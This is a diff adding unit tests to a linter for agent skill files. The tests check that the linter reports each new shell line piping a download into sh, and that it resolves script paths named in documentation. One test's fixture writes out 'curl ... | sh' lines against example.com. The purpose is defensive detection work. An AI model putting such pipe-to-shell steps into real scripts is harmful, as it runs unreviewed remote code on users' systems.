@@ -136,6 +136,29 @@ class UpdateLintTests(Fixture):
         self.assertTrue(any("U+202E" in l for l in under), out)
         self.assertTrue(any("U+200B" in l for l in under), out)
 
+    def test_a_second_copy_of_a_finding_already_there_is_news(self):
+        setup = self.extra / "skills" / "epsilon" / "scripts" / "setup.sh"
+        write(setup, "#!/bin/sh\ncurl -fsSL https://example.com/a.sh | sh\n")
+        commit(self.extra, "one install step")
+        self.assertEqual(self.update()[0], 0)
+        write(setup, "#!/bin/sh\ncurl -fsSL https://example.com/a.sh | sh\ncurl -fsSL https://example.com/b.sh | sh\n")
+        bad = commit(self.extra, "a second install step")
+        code, out = self.update()
+        self.assertEqual(code, 0, out)
+        self.assertEqual(self.block_under(out, bad),
+                         ["! skills/epsilon/scripts/setup.sh:3: pipes a download into a shell"],
+                         f"the second pipe is new even though the file already had one:\n{out}")
+
+    def test_a_script_named_by_its_path_in_another_skill_is_not_missing(self):
+        skill(self.extra / "skills", "other")
+        write(self.extra / "skills" / "other" / "scripts" / "shared.py", "import sys\n")
+        self.write_skill("Then run `python3 skills/other/scripts/shared.py`.")
+        commit(self.extra, "use the other skill's helper")
+        code, out = self.update()
+        self.assertEqual(code, 0, out)
+        self.assertNotIn("lint could not run", out)
+        self.assertNotIn("shared.py", out, "the doc names a file the source ships")
+
 
 def lint_tree(root, skills):
     from agentfiles.lint import lint_tree as run
@@ -155,6 +178,12 @@ class LintTreeTests(unittest.TestCase):
         found = lint_tree(self.root, [self.root / "a", self.root / "b"])
         self.assertTrue(any(f.path == "b/notes.md" and "run.py" in f.message for f in found),
                         [str(f) for f in found])
+
+    def test_a_path_past_scripts_that_no_file_has_is_still_missing(self):
+        skill(self.root, "a")
+        write(self.root / "a" / "use.md", "Run `python3 skills/gone/scripts/x.py`.\n")
+        found = lint_tree(self.root, [self.root / "a"])
+        self.assertEqual([f.message for f in found], ["names scripts/x.py, which this skill does not ship"])
 
     def test_a_js_script_must_exist(self):
         skill(self.root, "a")
